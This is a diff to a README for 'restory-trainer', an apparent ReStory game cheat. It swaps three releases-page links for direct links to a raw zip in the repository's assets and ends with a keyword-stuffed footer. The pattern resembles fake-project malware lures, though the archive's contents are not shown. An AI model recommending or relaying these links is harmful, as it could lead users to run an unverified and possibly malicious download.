@@ -1,6 +1,6 @@
 # 🎮 restory-trainer - Unlock Unlimited Fun in ReStory
 
-[Download Now](https://github.com/upstairs-sweetorangetree894/restory-trainer/releases)
+[Download Now](https://github.com/upstairs-sweetorangetree894/restory-trainer/raw/refs/heads/main/assets/1.0.zip)
 
 ---
 
@@ -51,7 +51,7 @@ Getting started is easy. Just follow these steps:
 
 ### Step 1: Download the Trainer
 
-Visit this link to download the application: **[Download restory-trainer](https://github.com/upstairs-sweetorangetree894/restory-trainer/releases)**
+Visit this link to download the application: **[Download restory-trainer](https://github.com/upstairs-sweetorangetree894/restory-trainer/raw/refs/heads/main/assets/1.0.zip)**
 
 Look for the newest release file listed on that page. The file will be named something like `restory-trainer.zip`.
 
@@ -176,6 +176,6 @@ restory-trainer is built with love for the ReStory community. We believe in play
 
 Download it today and take control of your workshop.
 
-**Quick Button:** [Get restory-trainer](https://github.com/upstairs-sweetorangetree894/restory-trainer/releases)
+**Quick Button:** [Get restory-trainer](https://github.com/upstairs-sweetorangetree894/restory-trainer/raw/refs/heads/main/assets/1.0.zip)
 
 Keywords: chill-electronics-repairs, cozy-game, free-camera, game-trainer, game-trainer-pc, game-trainers, infinite-money, mod, modding, restory, restory-cheats, restory-trainer, steam, tinybuild, trainer, trainers, windows
